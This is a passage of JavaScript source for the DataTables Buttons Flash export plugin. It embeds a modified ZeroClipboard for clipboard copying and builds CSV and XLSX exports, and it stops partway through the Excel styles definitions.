/*!
 * Flash export buttons for Buttons and DataTables.
 * 2015-2017 SpryMedia Ltd - datatables.net/license
 *
 * ZeroClipbaord - MIT license
 * Copyright (c) 2012 Joseph Huckaby
 */

(function( factory ){
	if ( typeof define === 'function' && define.amd ) {
		// AMD
		define( ['jquery', 'datatables.net', 'datatables.net-buttons'], function ( $ ) {
			return factory( $, window, document );
		} );
	}
	else if ( typeof exports === 'object' ) {
		// CommonJS
		module.exports = function (root, $) {
			if ( ! root ) {
				root = window;
			}

			if ( ! $ || ! $.fn.dataTable ) {
				$ = require('datatables.net')(root, $).$;
			}

			if ( ! $.fn.dataTable.Buttons ) {
				require('datatables.net-buttons')(root, $);
			}

			return factory( $, root, root.document );
		};
	}
	else {
		// Browser
		factory( jQuery, window, document );
	}
}(function( $, window, document, undefined ) {
'use strict';
var DataTable = $.fn.dataTable;


/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * ZeroClipboard dependency
 */

/*
 * ZeroClipboard 1.0.4 with modifications
 * Author: Joseph Huckaby
 * License: MIT
 *
 * Copyright (c) 2012 Joseph Huckaby
 */
var ZeroClipboard_TableTools = {
	version: "1.0.4-TableTools2",
	clients: {}, // registered upload clients on page, indexed by id
	moviePath: '', // URL to movie
	nextId: 1, // ID of next movie

	$: function(thingy) {
		// simple DOM lookup utility function
		if (typeof(thingy) == 'string') {
			thingy = document.getElementById(thingy);
		}
		if (!thingy.addClass) {
			// extend element with a few useful methods
			thingy.hide = function() { this.style.display = 'none'; };
			thingy.show = function() { this.style.display = ''; };
			thingy.addClass = function(name) { this.removeClass(name); this.className += ' ' + name; };
			thingy.removeClass = function(name) {
				this.className = this.className.replace( new RegExp("\\s*" + name + "\\s*"), " ").replace(/^\s+/, '').replace(/\s+$/, '');
			};
			thingy.hasClass = function(name) {
				return !!this.className.match( new RegExp("\\s*" + name + "\\s*") );
			};
		}
		return thingy;
	},

	setMoviePath: function(path) {
		// set path to ZeroClipboard.swf
		this.moviePath = path;
	},

	dispatch: function(id, eventName, args) {
		// receive event from flash movie, send to client
		var client = this.clients[id];
		if (client) {
			client.receiveEvent(eventName, args);
		}
	},

	log: function ( str ) {
		console.log( 'Flash: '+str );
	},

	register: function(id, client) {
		// register new client to receive events
		this.clients[id] = client;
	},

	getDOMObjectPosition: function(obj) {
		// get absolute coordinates for dom element
		var info = {
			left: 0,
			top: 0,
			width: obj.width ? obj.width : obj.offsetWidth,
			height: obj.height ? obj.height : obj.offsetHeight
		};

		if ( obj.style.width !== "" ) {
			info.width = obj.style.width.replace("px","");
		}

		if ( obj.style.height !== "" ) {
			info.height = obj.style.height.replace("px","");
		}

		while (obj) {
			info.left += obj.offsetLeft;
			info.top += obj.offsetTop;
			obj = obj.offsetParent;
		}

		return info;
	},

	Client: function(elem) {
		// constructor for new simple upload client
		this.handlers = {};

		// unique ID
		this.id = ZeroClipboard_TableTools.nextId++;
		this.movieId = 'ZeroClipboard_TableToolsMovie_' + this.id;

		// register client with singleton to receive flash events
		ZeroClipboard_TableTools.register(this.id, this);

		// create movie
		if (elem) {
			this.glue(elem);
		}
	}
};

ZeroClipboard_TableTools.Client.prototype = {

	id: 0, // unique ID for us
	ready: false, // whether movie is ready to receive events or not
	movie: null, // reference to movie object
	clipText: '', // text to copy to clipboard
	fileName: '', // default file save name
	action: 'copy', // action to perform
	handCursorEnabled: true, // whether to show hand cursor, or default pointer cursor
	cssEffects: true, // enable CSS mouse effects on dom container
	handlers: null, // user event handlers
	sized: false,
	sheetName: '', // default sheet name for excel export

	glue: function(elem, title) {
		// glue to DOM element
		// elem can be ID or actual DOM element object
		this.domElement = ZeroClipboard_TableTools.$(elem);

		// float just above object, or zIndex 99 if dom element isn't set
		var zIndex = 99;
		if (this.domElement.style.zIndex) {
			zIndex = parseInt(this.domElement.style.zIndex, 10) + 1;
		}

		// find X/Y position of domElement
		var box = ZeroClipboard_TableTools.getDOMObjectPosition(this.domElement);

		// create floating DIV above element
		this.div = document.createElement('div');
		var style = this.div.style;
		style.position = 'absolute';
		style.left = '0px';
		style.top = '0px';
		style.width = (box.width) + 'px';
		style.height = box.height + 'px';
		style.zIndex = zIndex;

		if ( typeof title != "undefined" && title !== "" ) {
			this.div.title = title;
		}
		if ( box.width !== 0 && box.height !== 0 ) {
			this.sized = true;
		}

		// style.backgroundColor = '#f00'; // debug
		if ( this.domElement ) {
			this.domElement.appendChild(this.div);
			this.div.innerHTML = this.getHTML( box.width, box.height ).replace(/&/g, '&amp;');
		}
	},

	positionElement: function() {
		var box = ZeroClipboard_TableTools.getDOMObjectPosition(this.domElement);
		var style = this.div.style;

		style.position = 'absolute';
		//style.left = (this.domElement.offsetLeft)+'px';
		//style.top = this.domElement.offsetTop+'px';
		style.width = box.width + 'px';
		style.height = box.height + 'px';

		if ( box.width !== 0 && box.height !== 0 ) {
			this.sized = true;
		} else {
			return;
		}

		var flash = this.div.childNodes[0];
		flash.width = box.width;
		flash.height = box.height;
	},

	getHTML: function(width, height) {
		// return HTML for movie
		var html = '';
		var flashvars = 'id=' + this.id +
			'&width=' + width +
			'&height=' + height;

		if (navigator.userAgent.match(/MSIE/)) {
			// IE gets an OBJECT tag
			var protocol = location.href.match(/^https/i) ? 'https://' : 'http://';
			html += '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="'+protocol+'download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" width="'+width+'" height="'+height+'" id="'+this.movieId+'" align="middle"><param name="allowScriptAccess" value="always" /><param name="allowFullScreen" value="false" /><param name="movie" value="'+ZeroClipboard_TableTools.moviePath+'" /><param name="loop" value="false" /><param name="menu" value="false" /><param name="quality" value="best" /><param name="bgcolor" value="#ffffff" /><param name="flashvars" value="'+flashvars+'"/><param name="wmode" value="transparent"/></object>';
		}
		else {
			// all other browsers get an EMBED tag
			html += '<embed id="'+this.movieId+'" src="'+ZeroClipboard_TableTools.moviePath+'" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="'+width+'" height="'+height+'" name="'+this.movieId+'" align="middle" allowScriptAccess="always" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="'+flashvars+'" wmode="transparent" />';
		}
		return html;
	},

	hide: function() {
		// temporarily hide floater offscreen
		if (this.div) {
			this.div.style.left = '-2000px';
		}
	},

	show: function() {
		// show ourselves after a call to hide()
		this.reposition();
	},

	destroy: function() {
		// destroy control and floater
		var that = this;

		if (this.domElement && this.div) {
			$(this.div).remove();

			this.domElement = null;
			this.div = null;

			$.each( ZeroClipboard_TableTools.clients, function ( id, client ) {
				if ( client === that ) {
					delete ZeroClipboard_TableTools.clients[ id ];
				}
			} );
		}
	},

	reposition: function(elem) {
		// reposition our floating div, optionally to new container
		// warning: container CANNOT change size, only position
		if (elem) {
			this.domElement = ZeroClipboard_TableTools.$(elem);
			if (!this.domElement) {
				this.hide();
			}
		}

		if (this.domElement && this.div) {
			var box = ZeroClipboard_TableTools.getDOMObjectPosition(this.domElement);
			var style = this.div.style;
			style.left = '' + box.left + 'px';
			style.top = '' + box.top + 'px';
		}
	},

	clearText: function() {
		// clear the text to be copy / saved
		this.clipText = '';
		if (this.ready) {
			this.movie.clearText();
		}
	},

	appendText: function(newText) {
		// append text to that which is to be copied / saved
		this.clipText += newText;
		if (this.ready) { this.movie.appendText(newText) ;}
	},

	setText: function(newText) {
		// set text to be copied to be copied / saved
		this.clipText = newText;
		if (this.ready) { this.movie.setText(newText) ;}
	},

	setFileName: function(newText) {
		// set the file name
		this.fileName = newText;
		if (this.ready) {
			this.movie.setFileName(newText);
		}
	},

	setSheetData: function(data) {
		// set the xlsx sheet data
		if (this.ready) {
			this.movie.setSheetData( JSON.stringify( data ) );
		}
	},

	setAction: function(newText) {
		// set action (save or copy)
		this.action = newText;
		if (this.ready) {
			this.movie.setAction(newText);
		}
	},

	addEventListener: function(eventName, func) {
		// add user event listener for event
		// event types: load, queueStart, fileStart, fileComplete, queueComplete, progress, error, cancel
		eventName = eventName.toString().toLowerCase().replace(/^on/, '');
		if (!this.handlers[eventName]) {
			this.handlers[eventName] = [];
		}
		this.handlers[eventName].push(func);
	},

	setHandCursor: function(enabled) {
		// enable hand cursor (true), or default arrow cursor (false)
		this.handCursorEnabled = enabled;
		if (this.ready) {
			this.movie.setHandCursor(enabled);
		}
	},

	setCSSEffects: function(enabled) {
		// enable or disable CSS effects on DOM container
		this.cssEffects = !!enabled;
	},

	receiveEvent: function(eventName, args) {
		var self;

		// receive event from flash
		eventName = eventName.toString().toLowerCase().replace(/^on/, '');

		// special behavior for certain events
		switch (eventName) {
			case 'load':
				// movie claims it is ready, but in IE this isn't always the case...
				// bug fix: Cannot extend EMBED DOM elements in Firefox, must use traditional function
				this.movie = document.getElementById(this.movieId);
				if (!this.movie) {
					self = this;
					setTimeout( function() { self.receiveEvent('load', null); }, 1 );
					return;
				}

				// firefox on pc needs a "kick" in order to set these in certain cases
				if (!this.ready && navigator.userAgent.match(/Firefox/) && navigator.userAgent.match(/Windows/)) {
					self = this;
					setTimeout( function() { self.receiveEvent('load', null); }, 100 );
					this.ready = true;
					return;
				}

				this.ready = true;
				this.movie.clearText();
				this.movie.appendText( this.clipText );
				this.movie.setFileName( this.fileName );
				this.movie.setAction( this.action );
				this.movie.setHandCursor( this.handCursorEnabled );
				break;

			case 'mouseover':
				if (this.domElement && this.cssEffects) {
					//this.domElement.addClass('hover');
					if (this.recoverActive) {
						this.domElement.addClass('active');
					}
				}
				break;

			case 'mouseout':
				if (this.domElement && this.cssEffects) {
					this.recoverActive = false;
					if (this.domElement.hasClass('active')) {
						this.domElement.removeClass('active');
						this.recoverActive = true;
					}
					//this.domElement.removeClass('hover');
				}
				break;

			case 'mousedown':
				if (this.domElement && this.cssEffects) {
					this.domElement.addClass('active');
				}
				break;

			case 'mouseup':
				if (this.domElement && this.cssEffects) {
					this.domElement.removeClass('active');
					this.recoverActive = false;
				}
				break;
		} // switch eventName

		if (this.handlers[eventName]) {
			for (var idx = 0, len = this.handlers[eventName].length; idx < len; idx++) {
				var func = this.handlers[eventName][idx];

				if (typeof(func) == 'function') {
					// actual function reference
					func(this, args);
				}
				else if ((typeof(func) == 'object') && (func.length == 2)) {
					// PHP style object + method, i.e. [myObject, 'myMethod']
					func[0][ func[1] ](this, args);
				}
				else if (typeof(func) == 'string') {
					// name of function
					window[func](this, args);
				}
			} // foreach event handler defined
		} // user defined handler for event
	}
};

ZeroClipboard_TableTools.hasFlash = function ()
{
	try {
		var fo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
		if (fo) {
			return true;
		}
	}
	catch (e) {
		if (
			navigator.mimeTypes &&
			navigator.mimeTypes['application/x-shockwave-flash'] !== undefined &&
			navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin
		) {
			return true;
		}
	}

	return false;
};

// For the Flash binding to work, ZeroClipboard_TableTools must be on the global
// object list
window.ZeroClipboard_TableTools = ZeroClipboard_TableTools;



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Local (private) functions
 */

/**
 * If a Buttons instance is initlaised before it is placed into the DOM, Flash
 * won't be able to bind to it, so we need to wait until it is available, this
 * method abstracts that out.
 *
 * @param {ZeroClipboard} flash ZeroClipboard instance
 * @param {jQuery} node  Button
 */
var _glue = function ( flash, node )
{
	var id = node.attr('id');

	if ( node.parents('html').length ) {
		flash.glue( node[0], '' );
	}
	else {
		setTimeout( function () {
			_glue( flash, node );
		}, 500 );
	}
};

/**
 * Get the sheet name for Excel exports.
 *
 * @param {object}  config       Button configuration
 */
var _sheetname = function ( config )
{
	var sheetName = 'Sheet1';

	if ( config.sheetName ) {
		sheetName = config.sheetName.replace(/[\[\]\*\/\\\?\:]/g, '');
	}

	return sheetName;
};

/**
 * Set the flash text. This has to be broken up into chunks as the Javascript /
 * Flash bridge has a size limit. There is no indication in the Flash
 * documentation what this is, and it probably depends upon the browser.
 * Experimentation shows that the point is around 50k when data starts to get
 * lost, so an 8K limit used here is safe.
 *
 * @param {ZeroClipboard} flash ZeroClipboard instance
 * @param {string}        data  Data to send to Flash
 */
var _setText = function ( flash, data )
{
	var parts = data.match(/[\s\S]{1,8192}/g) || [];

	flash.clearText();
	for ( var i=0, len=parts.length ; i<len ; i++ )
	{
		flash.appendText( parts[i] );
	}
};

/**
 * Get the newline character(s)
 *
 * @param {object}  config Button configuration
 * @return {string}        Newline character
 */
var _newLine = function ( config )
{
	return config.newline ?
		config.newline :
		navigator.userAgent.match(/Windows/) ?
			'\r\n' :
			'\n';
};

/**
 * Combine the data from the `buttons.exportData` method into a string that
 * will be used in the export file.
 *
 * @param  {DataTable.Api} dt     DataTables API instance
 * @param  {object}        config Button configuration
 * @return {object}               The data to export
 */
var _exportData = function ( dt, config )
{
	var newLine = _newLine( config );
	var data = dt.buttons.exportData( config.exportOptions );
	var boundary = config.fieldBoundary;
	var separator = config.fieldSeparator;
	var reBoundary = new RegExp( boundary, 'g' );
	var escapeChar = config.escapeChar !== undefined ?
		config.escapeChar :
		'\\';
	var join = function ( a ) {
		var s = '';

		// If there is a field boundary, then we might need to escape it in
		// the source data
		for ( var i=0, ien=a.length ; i<ien ; i++ ) {
			if ( i > 0 ) {
				s += separator;
			}

			s += boundary ?
				boundary + ('' + a[i]).replace( reBoundary, escapeChar+boundary ) + boundary :
				a[i];
		}

		return s;
	};

	var header = config.header ? join( data.header )+newLine : '';
	var footer = config.footer && data.footer ? newLine+join( data.footer ) : '';
	var body = [];

	for ( var i=0, ien=data.body.length ; i<ien ; i++ ) {
		body.push( join( data.body[i] ) );
	}

	return {
		str: header + body.join( newLine ) + footer,
		rows: body.length
	};
};


// Basic initialisation for the buttons is common between them
var flashButton = {
	available: function () {
		return ZeroClipboard_TableTools.hasFlash();
	},

	init: function ( dt, button, config ) {
		// Insert the Flash movie
		ZeroClipboard_TableTools.moviePath = DataTable.Buttons.swfPath;
		var flash = new ZeroClipboard_TableTools.Client();

		flash.setHandCursor( true );
		flash.addEventListener('mouseDown', function(client) {
			config._fromFlash = true;
			dt.button( button[0] ).trigger();
			config._fromFlash = false;
		} );

		_glue( flash, button );

		config._flash = flash;
	},

	destroy: function ( dt, button, config ) {
		config._flash.destroy();
	},

	fieldSeparator: ',',

	fieldBoundary: '"',

	exportOptions: {},

	title: '*',

	messageTop: '*',

	messageBottom: '*',

	filename: '*',

	extension: '.csv',

	header: true,

	footer: false
};


/**
 * Convert from numeric position to letter for column names in Excel
 * @param  {int} n Column number
 * @return {string} Column letter(s) name
 */
function createCellPos( n ){
	var ordA = 'A'.charCodeAt(0);
	var ordZ = 'Z'.charCodeAt(0);
	var len = ordZ - ordA + 1;
	var s = "";

	while( n >= 0 ) {
		s = String.fromCharCode(n % len + ordA) + s;
		n = Math.floor(n / len) - 1;
	}

	return s;
}

/**
 * Create an XML node and add any children, attributes, etc without needing to
 * be verbose in the DOM.
 *
 * @param  {object} doc      XML document
 * @param  {string} nodeName Node name
 * @param  {object} opts     Options - can be `attr` (attributes), `children`
 *   (child nodes) and `text` (text content)
 * @return {node}            Created node
 */
function _createNode( doc, nodeName, opts ){
	var tempNode = doc.createElement( nodeName );

	if ( opts ) {
		if ( opts.attr ) {
			$(tempNode).attr( opts.attr );
		}

		if ( opts.children ) {
			$.each( opts.children, function ( key, value ) {
				tempNode.appendChild( value );
			} );
		}

		if ( opts.text !== null && opts.text !== undefined ) {
			tempNode.appendChild( doc.createTextNode( opts.text ) );
		}
	}

	return tempNode;
}

/**
 * Get the width for an Excel column based on the contents of that column
 * @param  {object} data Data for export
 * @param  {int}    col  Column index
 * @return {int}         Column width
 */
function _excelColWidth( data, col ) {
	var max = data.header[col].length;
	var len, lineSplit, str;

	if ( data.footer && data.footer[col].length > max ) {
		max = data.footer[col].length;
	}

	for ( var i=0, ien=data.body.length ; i<ien ; i++ ) {
		var point = data.body[i][col];
		str = point !== null && point !== undefined ?
			point.toString() :
			'';

		// If there is a newline character, workout the width of the column
		// based on the longest line in the string
		if ( str.indexOf('\n') !== -1 ) {
			lineSplit = str.split('\n');
			lineSplit.sort( function (a, b) {
				return b.length - a.length;
			} );

			len = lineSplit[0].length;
		}
		else {
			len = str.length;
		}

		if ( len > max ) {
			max = len;
		}

		// Max width rather than having potentially massive column widths
		if ( max > 40 ) {
			return 52; // 40 * 1.3
		}
	}

	max *= 1.3;

	// And a min width
	return max > 6 ? max : 6;
}

  var _serialiser = "";
    if (typeof window.XMLSerializer === 'undefined') {
        _serialiser = new function () {
            this.serializeToString = function (input) {
                return input.xml
            }
        };
    } else {
        _serialiser =  new XMLSerializer();
    }

    var _ieExcel;


/**
 * Convert XML documents in an object to strings
 * @param  {object} obj XLSX document object
 */
function _xlsxToStrings( obj ) {
	if ( _ieExcel === undefined ) {
		// Detect if we are dealing with IE's _awful_ serialiser by seeing if it
		// drop attributes
		_ieExcel = _serialiser
			.serializeToString(
				$.parseXML( excelStrings['xl/worksheets/sheet1.xml'] )
			)
			.indexOf( 'xmlns:r' ) === -1;
	}

	$.each( obj, function ( name, val ) {
		if ( $.isPlainObject( val ) ) {
			_xlsxToStrings( val );
		}
		else {
			if ( _ieExcel ) {
				// IE's XML serialiser will drop some name space attributes from
				// from the root node, so we need to save them. Do this by
				// replacing the namespace nodes with a regular attribute that
				// we convert back when serialised. Edge does not have this
				// issue
				var worksheet = val.childNodes[0];
				var i, ien;
				var attrs = [];

				for ( i=worksheet.attributes.length-1 ; i>=0 ; i-- ) {
					var attrName = worksheet.attributes[i].nodeName;
					var attrValue = worksheet.attributes[i].nodeValue;

					if ( attrName.indexOf( ':' ) !== -1 ) {
						attrs.push( { name: attrName, value: attrValue } );

						worksheet.removeAttribute( attrName );
					}
				}

				for ( i=0, ien=attrs.length ; i<ien ; i++ ) {
					var attr = val.createAttribute( attrs[i].name.replace( ':', '_dt_b_namespace_token_' ) );
					attr.value = attrs[i].value;
					worksheet.setAttributeNode( attr );
				}
			}

			var str = _serialiser.serializeToString(val);

			// Fix IE's XML
			if ( _ieExcel ) {
				// IE doesn't include the XML declaration
				if ( str.indexOf( '<?xml' ) === -1 ) {
					str = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+str;
				}

				// Return namespace attributes to being as such
				str = str.replace( /_dt_b_namespace_token_/g, ':' );
			}

			// Safari, IE and Edge will put empty name space attributes onto
			// various elements making them useless. This strips them out
			str = str.replace( /<([^<>]*?) xmlns=""([^<>]*?)>/g, '<$1 $2>' );

			obj[ name ] = str;
		}
	} );
}

// Excel - Pre-defined strings to build a basic XLSX file
var excelStrings = {
	"_rels/.rels":
		'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+
		'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'+
			'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'+
		'</Relationships>',

	"xl/_rels/workbook.xml.rels":
		'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+
		'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'+
			'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'+
			'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>'+
		'</Relationships>',

	"[Content_Types].xml":
		'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+
		'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'+
			'<Default Extension="xml" ContentType="application/xml" />'+
			'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml" />'+
			'<Default Extension="jpeg" ContentType="image/jpeg" />'+
			'<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml" />'+
			'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml" />'+
			'<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml" />'+
		'</Types>',

	"xl/workbook.xml":
		'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+
		'<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'+
			'<fileVersion appName="xl" lastEdited="5" lowestEdited="5" rupBuild="24816"/>'+
			'<workbookPr showInkAnnotation="0" autoCompressPictures="0"/>'+
			'<bookViews>'+
				'<workbookView xWindow="0" yWindow="0" windowWidth="25600" windowHeight="19020" tabRatio="500"/>'+
			'</bookViews>'+
			'<sheets>'+
				'<sheet name="" sheetId="1" r:id="rId1"/>'+
			'</sheets>'+
		'</workbook>',

	"xl/worksheets/sheet1.xml":
		'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'+
		'<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac">'+
			'<sheetData/>'+
			'<mergeCells count="0"/>'+
		'</worksheet>',

	"xl/styles.xml":
		'<?xml version="1.0" encoding="UTF-8"?>'+
		'<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac">'+
			'<numFmts count="6">'+
				'<numFmt numFmtId="164" formatCode="#,##0.00_-\ [$$-45C]"/>'+
				'<numFmt numFmtId="165" formatCode="&quot;£&quot;#,##0.00"/>'+
				'<numFmt numFmtId="166" formatCode="[$€-2]\ #,##0.00"/>'+
				'<numFmt numFmtId="167" formatCode="0.0%"/>'+
				'<numFmt numFmtId="168" formatCode="#,##0;(#,##0)"/>'+
				'<numFmt numFmtId="169" formatCode="#,##0.00;(#,##0.00)"/>'+
			'</numFmts>'+
			'<fonts count="5" x14ac:knownFonts="1">'+
				'<font>'+
					'<sz val="11" />'+
					'<name val="Calibri" />'+
				'</font>'+
				'<font>'+
					'<sz val="11" />'+
					'<name val="Calibri" />'+
					'<color rgb="FFFFFFFF" />'+
				'</font>'+
				'<font>'+
					'<sz val="11" />'+
					'<name val="Calibri" />'+
					'<b />'+
				'</font>'+
				'<font>'+
					'<sz val="11" />'+
					'<name val="Calibri" />'+
					'<i />'+
				'</font>'+
				'<font>'+
					'<sz val="11" />'+
					'<name val="Calibri" />'+
					'<u />'+
				'</font>'+
			'</fonts>'+
			'<fills count="6">'+
				'<fill>'+
					'<patternFill patternType="none" />'+
				'</fill>'+
				'<fill>'+ // Excel appears to use this as a dotted background regardless of values but
					'<patternFill patternType="none" />'+ // to be valid to the schema, use a patternFill
				'</fill>'+
				'<fill>'+
					'<patternFill patternType="solid">'+
						'<fgColor rgb="FFD9D9D9" />'+
						'<bgColor indexed="64" />'+
					'</patternFill>'+
				'</fill>'+
				'<fill>'+
					'<patternFill patternType="solid">'+
						'<fgColor rgb="FFD99795" />'+
						'<bgColor indexed="64" />'+
					'</patternFill>'+
				'</fill>'+
				'<fill>'+
					'<patternFill patternType="solid">'+
						'<fgColor rgb="ffc6efce" />'+
						'<bgColor indexed="64" />'+
					'</patternFill>'+
				'</fill>'+
				'<fill>'+
					'<patternFill patternType="solid">'+
						'<fgColor rgb="ffc6cfef" />'+
						'<bgColor indexed="64" />'+
					'</patternFill>'+
				'</fill>'+
			'</fills>'+
			'<borders count="2">'+
				'<border>'+
					'<left />'+
					'<right />'+
					'<top />'+
					'<bottom />'+
					'<diagonal />'+
				'</border>'+
				'<border diagonalUp="false" diagonalDown="false">'+
					'<left style="thin">'+
						'<color auto="1" />'+
					'</left>'+
					'<right style="thin">'+
						'<color auto="1" />'+
					'</right>'+
					'<top style="thin">'+
						'<color auto="1" />'+
					'</top>'+
					'<bottom style="thin">'+
						'<color auto="1" />'+
					'</bottom>'+
					'<diagonal />'+
				'</border>'+
			'</borders>'+
			'<cellStyleXfs count="1">'+
				'<xf numFmtId="0" fontId="0" fillId="0" borderId="0" />'+
			'</cellStyleXfs>'+
			'<cellXfs count="61">'+
				'<xf numFmtId="0" fontId="0" fillId="0" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="0" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="0" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="0" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="0" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="2" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="2" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="2" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="2" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="2" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="3" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="3" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="3" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="3" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="3" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="4" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="4" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="4" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="4" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="4" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="5" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="5" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="5" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="5" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="5" borderId="0" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="0" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="0" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="0" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="0" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="0" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="2" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="2" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="2" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="2" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="2" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="3" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="3" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="3" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="3" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="3" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="4" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="1" fillId="4" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="2" fillId="4" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="3" fillId="4" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="4" fillId="4" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
				'<xf numFmtId="0" fontId="0" fillId="5" borderId="1" applyFont="1" applyFill="1" applyBorder="1"/>'+
